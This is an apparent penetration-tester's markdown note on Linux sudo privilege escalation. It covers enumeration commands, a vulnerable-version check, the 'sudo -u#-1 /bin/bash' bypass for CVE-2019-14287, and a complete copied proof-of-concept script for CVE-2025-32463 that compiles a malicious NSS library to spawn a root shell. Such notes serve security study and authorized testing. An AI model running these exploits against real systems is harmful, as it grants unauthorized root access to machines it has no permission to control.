---
id: Sudo Enumeration
aliases: []
tags:
  - Linux/Privesc/Sudo-Enumeration
links: "[[Privesc]]"
---

# Sudo Enumeration

___

<!-- Commands {{{-->
## Commands

Check which commands the current user may run

<!-- Tip {{{-->
> [!tip]
>
> Exploit the found command(*s*)
>
> - [GTFOBins](https://gtfobins.github.io/#+sudo)
<!-- }}} -->

[sudo](https://man7.org/linux/man-pages/man8/sudo.8.html) —
Execute a command as another user

```sh
sudo -l
```

[sudo](https://man7.org/linux/man-pages/man8/sudo.8.html) —
Run command as specified user

```sh
sudo -u <user> /bin/echo Hello World!
```
___
<!-- }}} -->

<!-- Version {{{-->
## Version

Check `sudo` version

```sh
sudo --version
```

```sh
sudo -V
```

Check if `sudo` version is in a vulnerable range

```sh
if sudo -V 2>/dev/null | grep -Eq 'Sudo ver 1\.[0-7]\.[0-9]+|1\.8\.1[0-9]|1\.8\.2[0-7]'; then
    echo ":: [+] :: Vulnerable sudo version found"
else
    echo ":: [-] :: Not vulnerable"
fi
```

[[SearchSploit]] — Search `sudo` version for public exploits

```sh
searchsploit sudo
```
___
<!-- }}} -->

<!-- Vulnerabilities {{{-->
## Vulnerabilities

<!-- CVE-2019-14287 {{{-->
### CVE-2019-14287

[CVE-2019-14287](https://nvd.nist.gov/vuln/detail/cve-2019-14287) —
In Sudo before `1.8.28`, an attacker
with access to a `Runas ALL` sudoer account
can bypass certain policy blacklists and session PAM modules, and can cause incorrect logging, by invoking sudo with a crafted user ID

```sh
sudo -u#-1 /bin/bash
```

<!-- }}} -->

<!-- CVE-2025-32463 {{{-->
### CVE-2025-32463

[CVE-2025-32463](https://nvd.nist.gov/vuln/detail/cve-2025-32463) —
Sudo versions before `1.9.17p1` (`1.9.14` - `1.9.17` < `1.9.17p1`)
allows unprivileged local users to escalate their privileges to root
via `sudo --chroot` option when `/etc/nsswitch.conf` file is used
from a user controlled directory

Validate vulnerability

```sh
sudo -R woot woot
```

<!-- Info {{{-->
> [!info]-
>
> Vulnerable sudo
>
> ```sh
> pwn ~ $ sudo -R woot woot
> sudo: woot: No such file or directory
> ```
>
> Patched sudo
>
> ```sh
> pwn ~ $ sudo -R woot woot
> [sudo] password for pwn:
> sudo: you are not permitted to use the -R option with woot
> ```
<!-- }}} -->

Proof‑of‑concept exploit that spawns a root shell inside the chroot

```sh
./sudo-chwoot.sh
```

<!-- Exploit {{{-->
> [!tip]- Exploit
>
> [GitHub - pr0v3rbs/CVE-2025-32463_chwoot](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/blob/main/sudo-chwoot.sh)
>
> ```sh
> #!/bin/bash
> # sudo-chwoot.sh
> # CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
> #                  @ Stratascale Cyber Research Unit (CRU)
> STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
> cd ${STAGE?} || exit 1
>
> if [ $# -eq 0 ]; then
>     # If no command is provided, default to an interactive root shell.
>     CMD="/bin/bash"
> else
>     # Otherwise, use the provided arguments as the command to execute.
>     CMD="$@"
> fi
>
> # Escape the command to safely include it in a C string literal.
> # This handles backslashes and double quotes.
> CMD_C_ESCAPED=$(printf '%s' "$CMD" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g')
>
> cat > woot1337.c<<EOF
> #include <stdlib.h>
> #include <unistd.h>
>
> __attribute__((constructor)) void woot(void) {
>   setreuid(0,0);
>   setregid(0,0);
>   chdir("/");
>   execl("/bin/sh", "sh", "-c", "${CMD_C_ESCAPED}", NULL);
> }
> EOF
>
> mkdir -p woot/etc libnss_
> echo "passwd: /woot1337" > woot/etc/nsswitch.conf
> cp /etc/group woot/etc
> gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
>
> echo "woot!"
> sudo -R woot woot
> rm -rf ${STAGE?}
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->
